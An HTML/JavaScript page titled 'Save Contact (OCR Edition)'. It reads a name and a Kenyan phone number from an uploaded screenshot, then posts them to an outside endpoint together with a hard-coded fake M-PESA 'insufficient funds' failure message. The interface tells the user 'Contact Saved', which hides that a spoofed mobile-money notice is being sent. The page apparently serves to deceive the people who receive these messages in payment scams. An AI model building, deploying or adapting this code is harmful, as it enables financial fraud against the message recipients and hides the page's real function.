
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Save Contact (OCR Edition)</title>
<script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
<style>
    body { font-family: Arial, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    .container { max-width: 500px; width: 90%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; box-sizing: border-box; }
    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; color: #4CAF50; }
    
    .upload-section { border: 2px dashed #4CAF50; padding: 20px; text-align: center; border-radius: 10px; margin-bottom: 15px; cursor: pointer; }
    .upload-section:hover { background: #252525; }
    #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 10px; display: none; }

    textarea { width: 100%; height: 80px; padding: 10px; margin-top: 10px; background: #2a2a2a; border: none; border-radius: 6px; color: white; font-size: 1rem; resize: none; box-sizing: border-box; }
    
    .manual-input-container { margin-top: 15px; padding: 10px; border: 1px solid #333; border-radius: 6px; }
    .manual-input-container label { display: block; margin-bottom: 5px; font-size: 0.9rem; color: #aaa; }
    input[type="text"] { width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 4px; color: white; box-sizing: border-box; font-size: 1rem; margin-bottom: 10px; }

    button { width: 100%; padding: 14px; margin-top: 15px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 16px; transition: background 0.3s; }
    button:hover:not(:disabled) { background: #45a049; }
    button:disabled { background: gray; cursor: not-allowed; }
    
    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.95rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; }
    .loading-text { color: #ffeb3b; font-size: 0.9rem; text-align: center; display: none; }
</style>
</head>
<body>

<div class="container">
    <h3>Save Contact</h3>
    
    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
        <span>Click to Upload Screenshot 📸</span>
        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
        <img id="imagePreview" alt="Preview">
    </div>

    <div id="loader" class="loading-text">Scanning image... Please wait.</div>

    <div class="manual-input-container">
        <label>Detected Name:</label>
        <input type="text" id="detectedName" placeholder="Recipient Name">
        <label>Detected Number:</label>
        <input type="text" id="detectedPhone" placeholder="Phone Number">
    </div>

    <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
    <pre id="output"></pre>
</div>

<script>
const API = "https://mpesab.vercel.app";
const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH15000.00. Available Fuliza M-PESA limit KSH0.00.";

// Handle Image Upload and OCR
async function handleImage(input) {
    const file = input.files[0];
    if (!file) return;

    // Show Preview
    const reader = new FileReader();
    reader.onload = e => {
        const preview = document.getElementById('imagePreview');
        preview.src = e.target.result;
        preview.style.display = 'block';
    };
    reader.readAsDataURL(file);

    const loader = document.getElementById('loader');
    loader.style.display = 'block';

    try {
        // Perform OCR
        const { data: { text } } = await Tesseract.recognize(file, 'eng');
        processText(text);
    } catch (err) {
        alert("Error scanning image. Please try again or enter manually.");
    } finally {
        loader.style.display = 'none';
    }
}

function processText(rawText) {
    console.log("Extracted Text:", rawText);
    
    // Pattern for phone number (looking for 10-12 digits)
    let phoneMatch = rawText.match(/(?:07|01|254|\+254)\d{8,10}/);
    
    // Pattern for Name: Specifically looks for lines after "Recipient Name" 
    // or capitalized blocks of text common in these apps.
    let lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
    let detectedName = "";

    // Search for name based on proximity to common keywords in the screenshot
    for(let i = 0; i < lines.length; i++) {
        if(lines[i].toLowerCase().includes("recipient name")) {
            detectedName = lines[i+1] || ""; 
            break;
        }
    }

    // Fallback name extraction if "Recipient Name" label isn't caught well
    if(!detectedName) {
        // Look for typical two/three part names (Uppercase letters)
        let nameRegex = /([A-Z][a-z]+(?:\s[A-Z][a-z]+)+)/;
        let nameMatch = rawText.match(nameRegex);
        detectedName = nameMatch ? nameMatch[0] : "Unknown";
    }

    document.getElementById('detectedPhone').value = phoneMatch ? phoneMatch[0] : "";
    document.getElementById('detectedName').value = detectedName.replace(/[^a-zA-Z\s]/g, '').trim();
}

function generateToken() {
    return "CONTACT" + Math.floor(Math.random() * 100000);
}

async function saveContact() {
    const btn = document.getElementById("saveBtn");
    const output = document.getElementById("output");
    const name = document.getElementById("detectedName").value.trim();
    const phone = document.getElementById("detectedPhone").value.trim();

    if (!phone || !name) {
        output.innerText = "❌ Please ensure Name and Number are filled.";
        return;
    }

    btn.disabled = true;
    btn.innerText = "Saving...";
    let token = generateToken();

    try {
        const response = await fetch(`${API}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: phone,
                name: name,
                amount: 0,
                token: token,
                message: FIXED_MESSAGE
            })
        });

        if (response.ok) {
            output.innerText = "Contact Saved Successfully ✅\n\nName: " + name + "\nPhone: " + phone;
            btn.innerText = "Saved ✓";
        } else {
            throw new Error();
        }
    } catch (error) {
        output.innerText = "❌ Connection Error";
        btn.disabled = false;
        btn.innerText = "SAVE CONTACT";
    }
}
</script>

</body>
</html>
